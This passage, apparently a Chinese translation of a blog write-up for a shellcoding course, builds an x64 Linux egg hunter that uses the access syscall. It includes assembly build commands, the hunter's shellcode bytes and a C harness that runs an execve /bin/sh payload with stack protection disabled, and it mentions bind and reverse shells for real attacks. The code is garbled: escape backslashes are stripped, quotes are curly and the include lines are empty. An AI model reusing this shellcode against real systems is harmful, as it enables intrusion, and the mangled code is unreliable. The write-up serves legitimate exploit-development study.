在测试过程中，对于地址0x1000，它返回了EFAULT（0xfffffffffffffff2），而这正是我所希望的。
这让我们希望大增，然而这种美好的感觉并没有停留太久，直到我写了Egg
Hunter的代码，并讲第一个地址定位在真正有效载荷所在的section时，它并没有按照我想象的那样工作。具体来说，我的思路是尝试获取4个字节，并与Egg进行比较。
**但是，当它本应该返回EFAULT并中断（SIGSEGV）的时候，并没有这样做。** 在这个时候，我意识到，这种全新的Egg
Hunting方式可能并不是有效的，因此我后退了一步，开始考虑其他方法。
**Egg Hunter的最终尝试**
****
我决定使用Skape曾用过的access调用，因为这是最为稳妥的一种方式。此外，我还选择使用4字节的Egg：0xbeefbeef。我们知道，Egg越大，其已经在VAS中存在的可能性就越小。所以我觉得，如果说在32位系统中4字节可以较好的使用，那么在我们64位的场景中，它应该也是不错的。
然而，因为我没有复制它的大小， **由于Egg是存在于其自己的代码之中，Hunter还是有非常高的可能性会检测到其自身。**
为避免这一情况，我将EAX（RAX中最低的32位）寄存器设置为不同的值，并确保它有正确的增量，如下图的第19、20行：
关于每个结构的详情，在这里就不做赘述了，大家请参考我此前所写的两篇文章：
[https://pentesterslife.blog/2017/11/01/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/](https://pentesterslife.blog/2017/11/01/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/)
[https://pentesterslife.blog/2017/11/13/x86_64-reverse-tcp-bind-shell-with-basic-authentication-on-linux-systems/](https://pentesterslife.blog/2017/11/13/x86_64-reverse-tcp-bind-shell-with-basic-authentication-on-linux-systems/)
在最开始（第4行），我将RSI置为0，RSI也就是access系统调用（F_OK=0）的第二个参数。同样，我们也将检查我们是否有可读权限的RDI置为0。请注意，实际上第一个可寻址的内存位置并不是0x00，但是它非常小，并且很接近于0。我们可以忽略到达它的延迟，否则我们就必须添加一段代码以增加这个过程。
其中的next_page标签包含将地址递增到下一个4096的倍数的代码，也就是内存中的下一页。
对于next_4_bytes标签，我们基本上是通过access系统调用来验证RDI中内存地址的可访问性，如果可访问，我们就获取其中的4个字节并与我们的Egg进行比较。
在编译之后：
    # nasm -felf64 egghunter.nasm -o egghunter.o && ld egghunter.o -o egghunter
提取十六进制代码：
    # for i in `objdump -d egghunter | tr ‘t’ ‘ ‘ | tr ‘ ‘ ‘n’ | egrep ‘^[0-9a-f]{2}$’ ` ; do echo -n “x$i” ; done
    x48x31xf6x56x5fx66x81xcfxffx0fx48xffxc7x6ax15x58x0fx05x3cxf2x74xefxb8xbdxefxbexefxfexc0xafx75xedxffxe7
将其添加到shellcode.c测试环境（使用简单的execve作为Payload）：
    #include 
    #include 
    #define EGG “xBExEFxBExEF”
    unsigned char hunter[] = 
    “x48x31xf6x56x5fx66x81xcfxffx0fx48xffxc7x6ax15x58x0fx05x3cxf2x74xefxb8xbdxefxbexefxfexc0xafx75xedxffxe7”;
    unsigned char payload[] = 
    EGG
    “x6ax3bx58x99x52x48xbbx2fx2fx62x69x6ex2fx73x68x53x54x5fx52x54x5ax57x54x5ex0fx05”;
    int main(void) {
    printf(“Egg hunter’s size (bytes): %lun”, strlen(hunter));
    printf(“Payload’s size (bytes): %lun”, strlen(payload));
    int (*ret)() = (int(*)())hunter;
    ret();
    }
并进行编译：
    # gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
最后成功运行：
在这个例子中，由于我使用了execve作为Payload，所以实际的Payload是比Egg
Hunter小的，就显得非常奇怪。然而，这个例子并不能在远程攻击中为我们带来价值。 **在实际场景中，我们会使用类似于主动连接（Bind
Shell）或者反向TCP连接（Reverse TCP Shell）的方式。**
**  
**
**进一步提升效率**
现在看起来已经大功告成了，但实际上还差一些。我们还希望能够更快地找到Payload，就像下面这个截图一样：
**简单来说，我将GDB附加到运行的进程上（Attach 7660），使用info proc
mappings命令检查代码的第一个section（第二和第三个是.data和.bss），将RDI寄存器设定为该值（set $RDI =
…），并使用continue (c)命令让Hunter继续寻找。**
大家可能会问，我为什么要这样进行。原因在于，即使我们已经做过了优化，但在64位结构中查找VAS中的用户空间还是需要耗费超级长的时间。我使用酷睿i7的笔记本运行了一整晚，都没有得到任何结果。前面说的方法可能在32位的VAS中非常有效，但一定不是64位的一个好选择。
并且，由于内存随机化（ASLR保护），我们并没有办法预测到代码第一个section的起始位置在哪里。
我多次运行了Shellcode应用，这些都是其不同的第一个代码section的地址：
这也就是为什么我们看到几乎所有的x64 Egg
Hunter，都是从RDX的内存地址开始搜索的。因为，在shellcode.c的测试代码中，RDX是内存位置的寄存器，用于存储内存中Egg
Hunter的代码。所以从这个位置开始，可以节省大量的搜索时间：
**选择RDX作为开始，不仅能让搜索变得更快（几乎是瞬间得到结果），并且还能让Egg Hunter的代码变得更短。**
因为在内存的这一部分，我们肯定有读的权限，所以也就无需再进行access系统调用来阻止SIGSEGV中断了。
这就是为什么一些代码会比此文中的例子短很多。
**因为它们为了保证搜索速度，做出了一些假设，并减少了搜索的范围，同时还减少了搜索过程的鲁棒性（Robustness）。**
鲁棒性在这里具体而言，是由于我们在实际应用中，一开始并不知道RDX值的含义，并且会有非常高的几率会运行到未分配的内存位置，或是没有读取权限的页。
总之，我们还是需要依靠一些耐心和运气，才能在x64的系统场景中真正实现这一方法。
**结语**
****
本文所使用到的所有源代码，均可以在我的Gitlab上找到：
[https://gitlab.com/0x4ndr3/SLAE64_Assignments](https://gitlab.com/0x4ndr3/SLAE64_Assignments)
感谢Vivek Ramachandran和Pentester Academy团队，他们使我学到了很多有趣的内容。